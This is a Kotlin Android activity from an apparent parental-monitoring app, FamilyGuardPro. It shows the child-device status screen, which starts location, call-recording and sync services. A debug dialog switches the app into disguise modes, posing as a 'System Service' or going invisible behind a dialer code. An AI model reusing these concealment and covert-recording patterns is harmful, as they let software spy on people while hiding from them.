package com.familyguardpro

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.PowerManager
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.familyguardpro.databinding.ActivityChildStatusBinding
import com.familyguardpro.network.ApiClient
import com.familyguardpro.services.DataSyncService
import com.familyguardpro.services.DeviceAdminReceiver
import com.familyguardpro.services.LocationService
import com.familyguardpro.services.WebSocketSyncService
import com.familyguardpro.utils.DataUsageTracker
import com.familyguardpro.utils.DeviceUtils
import com.familyguardpro.utils.PermissionsHelper
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class ChildStatusActivity : AppCompatActivity() {
    
    private lateinit var binding: ActivityChildStatusBinding
    private val dateFormat = SimpleDateFormat("HH:mm", Locale.getDefault())
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityChildStatusBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        setupUI()
        startServices()
        updateStatus()
    }
    
    private fun setupUI() {
        binding.btnSyncNow.setOnClickListener {
            syncNow()
        }
        
        // Long press on sync button to test invisible mode (for debugging)
        binding.btnSyncNow.setOnLongClickListener {
            showDisguiseTestDialog()
            true
        }
                // Direct test button for hiding
        binding.btnTestHide.setOnClickListener {
            showDisguiseTestDialog()
        }
                binding.btnUnpair.setOnClickListener {
            showUnpairDialog()
        }
    }
    
    private fun showDisguiseTestDialog() {
        val modes = arrayOf("Normal (FamilyGuard)", "System Service", "App Lock", "INVISIBLE (Hidden)")
        AlertDialog.Builder(this)
            .setTitle("Test Disguise Mode")
            .setItems(modes) { _, which ->
                when (which) {
                    0 -> {
                        AppDisguiseManager.switchToNormalMode(this)
                        Toast.makeText(this, "Switched to NORMAL mode", Toast.LENGTH_SHORT).show()
                    }
                    1 -> {
                        AppDisguiseManager.switchToSystemMode(this)
                        Toast.makeText(this, "Switched to SYSTEM mode", Toast.LENGTH_SHORT).show()
                    }
                    2 -> {
                        AppDisguiseManager.switchToAppLockMode(this)
                        Toast.makeText(this, "Switched to APP LOCK mode", Toast.LENGTH_SHORT).show()
                    }
                    3 -> {
                        AppDisguiseManager.switchToInvisibleMode(this)
                        Toast.makeText(this, "Switched to INVISIBLE mode!\nAccess via: *#*#00000#*#*", Toast.LENGTH_LONG).show()
                    }
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun startServices() {
        // Start location service
        try {
            val locationIntent = Intent(this, LocationService::class.java)
            startForegroundService(locationIntent)
        } catch (e: Exception) {
            // Service might already be running
        }
        
        // Start call recording service if enabled
        try {
            val prefs = (application as FamilyGuardApp).preferenceManager
            if (prefs.isCallRecordingEnabled()) {
                val callRecordIntent = Intent(this, com.familyguardpro.services.CallRecordService::class.java)
                startForegroundService(callRecordIntent)
            }
        } catch (e: Exception) {
            // Service might already be running
        }
        
        // Start sync service
        try {
            val syncIntent = Intent(this, DataSyncService::class.java)
            startService(syncIntent)
        } catch (e: Exception) {
            // Service might already be running
        }
    }
    
    private fun updateStatus() {
        val prefs = (application as FamilyGuardApp).preferenceManager
        val lastSync = prefs.getLastSyncTime()
        
        // Connection status
        binding.tvStatus.text = "Connected"
        binding.viewStatus.setBackgroundResource(R.drawable.ic_online)
        
        // Battery
        val batteryLevel = getBatteryLevel()
        binding.tvBattery.text = "$batteryLevel%"
        
        // Last sync
        if (lastSync > 0) {
            binding.tvLastSync.text = dateFormat.format(Date(lastSync))
        } else {
            binding.tvLastSync.text = "Never"
        }
        
        // WebSocket status
        val wsConnected = WebSocketSyncService.isConnected()
        binding.tvWsStatus.text = if (wsConnected) "🔌 WebSocket: Connected" else "🔌 WebSocket: Disconnected"
        
        // Data usage
        binding.tvDataUsage.text = DataUsageTracker.getFormattedMonthlyEstimate()
        
        // Activation Status
        updateActivationStatus()
    }
    
    private fun updateActivationStatus() {
        // Battery Optimization status
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        val isBatteryOptDisabled = pm.isIgnoringBatteryOptimizations(packageName)
        binding.tvBatteryOptStatus.text = if (isBatteryOptDisabled) "Disabled ✓" else "Not Disabled ✗"
        binding.tvBatteryOptStatus.setTextColor(ContextCompat.getColor(this, 
            if (isBatteryOptDisabled) R.color.success else R.color.error))
        
        // Auto-Start status (can't check programmatically, show as enabled if manufacturer settings opened)
        // For MIUI/Huawei/etc devices, show recommendation based on manufacturer
        val needsAutoStart = DeviceUtils.needsSpecialBackgroundHandling()
        if (needsAutoStart) {
            // On devices that need auto-start, suggest checking
            binding.tvAutoStartStatus.text = "Check Settings"
            binding.tvAutoStartStatus.setTextColor(ContextCompat.getColor(this, R.color.warning))
        } else {
            binding.tvAutoStartStatus.text = "Not Required ✓"
            binding.tvAutoStartStatus.setTextColor(ContextCompat.getColor(this, R.color.success))
        }
        
        // Accessibility status
        val hasAccessibility = PermissionsHelper.hasAccessibilityAccess(this)
        binding.tvAccessibilityStatus.text = if (hasAccessibility) "Enabled ✓" else "Disabled ✗"
        binding.tvAccessibilityStatus.setTextColor(ContextCompat.getColor(this, 
            if (hasAccessibility) R.color.success else R.color.error))
        
        // Device Admin status
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val isDeviceAdmin = dpm.isAdminActive(adminComponent)
        binding.tvDeviceAdminStatus.text = if (isDeviceAdmin) "Enabled ✓" else "Disabled ✗"
        binding.tvDeviceAdminStatus.setTextColor(ContextCompat.getColor(this, 
            if (isDeviceAdmin) R.color.success else R.color.error))
    }
    
    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }
    
    private fun syncNow() {
        binding.btnSyncNow.isEnabled = false
        binding.btnSyncNow.text = "Syncing..."
        
        lifecycleScope.launch {
            try {
                val syncIntent = Intent(this@ChildStatusActivity, DataSyncService::class.java)
                startService(syncIntent)
                
                kotlinx.coroutines.delay(2000)
                
                binding.btnSyncNow.isEnabled = true
                binding.btnSyncNow.text = "Sync Now"
                
                (application as FamilyGuardApp).preferenceManager.setLastSyncTime(System.currentTimeMillis())
                updateStatus()
                
                Toast.makeText(this@ChildStatusActivity, "Sync completed", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                binding.btnSyncNow.isEnabled = true
                binding.btnSyncNow.text = "Sync Now"
                Toast.makeText(this@ChildStatusActivity, "Sync failed: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    private fun showUnpairDialog() {
        AlertDialog.Builder(this)
            .setTitle("Unpair Device")
            .setMessage("Are you sure you want to unpair this device? You will need the parent's permission to pair again.")
            .setPositiveButton("Unpair") { _, _ ->
                unpairDevice()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun unpairDevice() {
        val prefs = (application as FamilyGuardApp).preferenceManager
        prefs.clear()
        
        // Go back to main activity
        startActivity(Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        })
        finish()
    }
    
    override fun onResume() {
        super.onResume()
        updateStatus()
    }
    
    override fun onBackPressed() {
        // Prevent going back - this is the child's main screen
        moveTaskToBack(true)
    }
}
